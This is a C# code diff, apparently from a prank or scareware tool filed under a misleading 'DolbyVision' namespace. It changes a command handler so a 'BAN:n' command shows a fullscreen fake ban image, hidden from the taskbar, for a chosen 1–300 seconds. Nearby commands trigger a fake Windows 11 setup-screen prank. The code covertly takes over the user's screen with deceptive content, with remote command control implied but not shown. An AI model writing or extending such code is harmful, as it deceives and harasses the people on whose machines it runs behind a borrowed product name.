@@ -440,9 +440,16 @@ namespace DolbyVision
                 {
                     return StartOobePrank("Win11");
                 }
-                if (cmd.Equals("BAN", StringComparison.OrdinalIgnoreCase))
+                if (cmd.Equals("BAN", StringComparison.OrdinalIgnoreCase) || cmd.StartsWith("BAN:", StringComparison.OrdinalIgnoreCase))
                 {
-                    return StartBanPrank();
+                    int sec = 5;
+                    if (cmd.StartsWith("BAN:"))
+                    {
+                        if (!int.TryParse(cmd.Substring(4), out sec)) sec = 5;
+                        if (sec < 1) sec = 1;
+                        if (sec > 300) sec = 300;
+                    }
+                    return StartBanPrank(sec);
                 }
                 if (cmd.StartsWith("SHOW:", StringComparison.OrdinalIgnoreCase))
                 {
@@ -613,7 +620,7 @@ namespace DolbyVision
 
 
         // ========== 封禁恶搞 ==========
-        private static string StartBanPrank()
+        private static string StartBanPrank(int seconds)
         {
             try
             {
@@ -636,16 +643,14 @@ namespace DolbyVision
                                 form.ShowInTaskbar = false;
                                 form.StartPosition = FormStartPosition.CenterScreen;
                                 form.BackColor = Color.Black;
-                                // 不在Alt+Tab中显示
                                 form.ShowIcon = false;
                                 var pictureBox = new PictureBox();
                                 pictureBox.Dock = DockStyle.Fill;
                                 pictureBox.SizeMode = PictureBoxSizeMode.Zoom;
                                 pictureBox.Image = banImage;
                                 form.Controls.Add(pictureBox);
-                                // 5秒后自动关闭
                                 var timer = new System.Windows.Forms.Timer();
-                                timer.Interval = 5000;
+                                timer.Interval = seconds * 1000;
                                 timer.Tick += (s, e) => { timer.Stop(); form.Close(); };
                                 timer.Start();
                                 form.ShowDialog();
@@ -655,7 +660,7 @@ namespace DolbyVision
                     });
                     t.IsBackground = true;
                     t.Start();
-                    return "OK: 封禁恶搞已启动(5秒全屏)";
+                    return "OK: 封禁恶搞已启动(" + seconds + "秒全屏)";
                 }
             }
             catch (Exception ex)
